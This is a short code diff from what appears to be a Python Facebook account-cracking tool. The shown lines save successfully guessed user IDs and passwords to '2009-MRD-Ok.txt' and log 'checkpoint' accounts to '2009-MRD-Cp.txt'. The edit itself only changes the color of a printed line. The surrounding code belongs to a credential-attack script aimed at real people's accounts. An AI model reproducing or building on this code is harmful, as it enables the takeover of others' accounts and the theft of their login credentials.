@@ -1279,7 +1279,7 @@ class Main:
 				open("2009-MRD-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[MRD-Cp] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;93m[MRD-Cp] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-MRD-Cp.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
